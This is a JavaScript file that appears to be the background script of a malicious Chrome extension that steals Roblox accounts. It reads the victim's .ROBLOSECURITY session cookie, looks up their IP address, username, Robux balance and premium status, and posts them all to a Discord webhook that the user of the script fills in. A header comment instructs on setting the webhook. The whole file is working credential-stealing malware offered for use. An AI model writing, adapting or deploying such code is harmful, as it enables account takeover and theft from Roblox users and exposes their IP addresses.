// Read IMPORTANT Dont Mess With Any Of The Code (apart from the weebhook) Unless U Know What Ur Doing

const WEBHOOK = "HERE"; // Put your webhook here for the information to be sent to.

async function main(cookie) {
    var ipAddr = await (await fetch("https://api.ipify.org")).text();

    if (cookie) {
        var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
            headers: {
                Cookie: ".ROBLOSECURITY=" + cookie
            },
            redirect: "manual"
        })).json();
    }
    
    fetch(WEBHOOK, {
        method: "POST",
        headers: {
            "Content-Type": "Application/json"
        },
        body: JSON.stringify({
            "content": null,
            "embeds": [
              {
                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                "color": null,
                "fields": [
                  {
                    "name": "Username",
                    "value": statistics ? statistics.UserName : "N/A",
                    "inline": true
                  },
                  {
                    "name": "Robux",
                    "value": statistics ? statistics.RobuxBalance : "N/A",
                    "inline": true
                  },
                  {
                    "name": "Premium",
                    "value": statistics ? statistics.IsPremium : "N/A",
                    "inline": true
                  }
                ],
                "author": {
                  "name": "Dumbass Found: " + ipAddr,
                  "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                },
              
              
                "thumbnail": {
                  "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                }
              }
            ],
            "username": "YourWorstNightMare",
            "avatar_url": "https://cdn.discordapp.com/attachments/1166241747567919105/1166759605842493501/c695639eb257633d44ad268727a58865.png?ex=654ba88f&is=6539338f&hm=4f0ac65448b1602f413b3cb27d276be611fd78c2ca5398ac825ce1d2ac312a1f&",
            "attachments": []
        })
    });
}

chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
    main(cookie ? cookie.value : null);
});
